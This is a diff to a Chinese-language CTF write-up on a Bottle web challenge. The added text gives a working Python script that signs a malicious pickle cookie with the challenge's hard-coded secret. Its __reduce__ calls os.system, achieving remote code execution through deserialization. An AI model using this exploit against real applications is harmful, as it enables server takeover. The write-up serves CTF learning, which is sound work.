@@ -92,3 +92,33 @@ requests.get('http://gz.imxbt.cn:20458/secret', cookies={'name': exp.decode()})
 ```
 伪造session发包，这里内容是什么不重要，因为根据源码name=admin也不能得到flag
 我们的目的是打反序列化，执行我们的命令就好了。
+这里官方的脚本好像不行，不知道是不是环境差异
+他这里是使用`cookie_encode`直接生成cookie，看了一下源码好像确实差不多的逻辑，但是题目毕竟是用的get_cookie在服务器直接设置cookie，那我们可以按照这个思路，用set_cookie，自己起一个服务生成cookie
+```python
+from bottle import route, run,response
+import os
+
+
+secret = "Hell0_H@cker_Y0u_A3r_Sm@r7"
+
+class exp():
+    def __reduce__(self):
+        cmd = "ls />1"
+        return (os.system, (cmd,))
+
+
+@route("/sign")
+def index():
+    try:
+        session = exp()
+        response.set_cookie("name", session, secret=secret)
+        return "success"
+    except:
+        return "pls no hax"
+
+
+if __name__ == "__main__":
+    os.chdir(os.path.dirname(__file__))
+    run(host="0.0.0.0", port=8081)
+```
+但是这个脚本生成的cookie在我本地起的环境可以rce，但是题目环境不行，可能是linux和windows有一些差别，只需要在linux上起服务就好了
